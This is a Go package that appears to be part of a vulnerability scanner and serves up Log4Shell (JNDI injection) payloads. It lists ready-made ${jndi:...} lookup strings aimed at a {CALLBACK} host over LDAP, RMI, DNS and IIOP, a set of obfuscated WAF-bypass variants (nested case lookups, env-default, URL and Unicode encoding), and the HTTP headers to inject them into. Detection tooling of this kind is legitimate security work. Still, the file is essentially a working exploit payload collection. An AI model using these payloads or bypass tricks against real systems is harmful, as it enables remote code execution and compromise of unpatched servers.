// Package jndi provides payloads for Log4Shell/JNDI Injection detection.
package jndi

// Protocol represents the JNDI lookup protocol.
type Protocol string

const (
	ProtocolLDAP  Protocol = "ldap"
	ProtocolLDAPS Protocol = "ldaps"
	ProtocolRMI   Protocol = "rmi"
	ProtocolDNS   Protocol = "dns"
	ProtocolIIOP  Protocol = "iiop"
	ProtocolCORBA Protocol = "corba"
)

// InjectionPoint represents where the JNDI payload is injected.
type InjectionPoint string

const (
	PointHeader    InjectionPoint = "header"
	PointParameter InjectionPoint = "parameter"
	PointPath      InjectionPoint = "path"
	PointBody      InjectionPoint = "body"
)

// Payload represents a JNDI injection payload.
type Payload struct {
	Value       string
	Protocol    Protocol
	Description string
	WAFBypass   bool
}

var payloads = []Payload{
	// Basic JNDI lookups
	{Value: "${jndi:ldap://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Basic LDAP JNDI lookup"},
	{Value: "${jndi:ldaps://{CALLBACK}/log4j}", Protocol: ProtocolLDAPS, Description: "LDAPS JNDI lookup"},
	{Value: "${jndi:rmi://{CALLBACK}/log4j}", Protocol: ProtocolRMI, Description: "RMI JNDI lookup"},
	{Value: "${jndi:dns://{CALLBACK}/log4j}", Protocol: ProtocolDNS, Description: "DNS JNDI lookup"},
	{Value: "${jndi:iiop://{CALLBACK}/log4j}", Protocol: ProtocolIIOP, Description: "IIOP JNDI lookup"},

	// Nested lookup bypass (CVE-2021-45046)
	{Value: "${${lower:j}ndi:${lower:l}${lower:d}${lower:a}${lower:p}://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Nested lower lookup bypass", WAFBypass: true},
	{Value: "${${upper:j}ndi:${upper:l}${upper:d}${upper:a}${upper:p}://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Nested upper lookup bypass", WAFBypass: true},
	{Value: "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Default value bypass", WAFBypass: true},

	// Environment variable bypass
	{Value: "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Env var default bypass", WAFBypass: true},
	{Value: "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Non-existent env bypass", WAFBypass: true},

	// URL encoding bypass
	{Value: "${jndi:ldap://{CALLBACK}/%61%70%69}", Protocol: ProtocolLDAP, Description: "URL encoded path", WAFBypass: true},

	// Space/special char bypass
	{Value: "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://{CALLBACK}/log4j}", Protocol: ProtocolLDAP, Description: "Mixed case nested lookup", WAFBypass: true},

	// Unicode bypass
	{Value: "\u0024\u007bjndi:ldap://{CALLBACK}/log4j\u007d", Protocol: ProtocolLDAP, Description: "Unicode escape bypass", WAFBypass: true},
}

// TargetHeaders are HTTP headers commonly vulnerable to Log4Shell.
var TargetHeaders = []string{
	"User-Agent",
	"X-Forwarded-For",
	"X-Api-Version",
	"Referer",
	"X-Druid-Comment",
	"Origin",
	"Accept-Language",
	"Authorization",
	"X-Request-Id",
	"X-Correlation-Id",
	"CF-Connecting-IP",
	"True-Client-IP",
	"X-Client-IP",
	"Forwarded",
	"X-Real-IP",
	"Contact",
	"X-Custom-Header",
}

// GetPayloads returns all JNDI injection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetWAFBypassPayloads returns only WAF bypass payloads.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetByProtocol returns payloads for a specific JNDI protocol.
func GetByProtocol(protocol Protocol) []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Protocol == protocol {
			result = append(result, p)
		}
	}
	return result
}

// GetTargetHeaders returns HTTP headers commonly vulnerable to Log4Shell.
func GetTargetHeaders() []string {
	return TargetHeaders
}
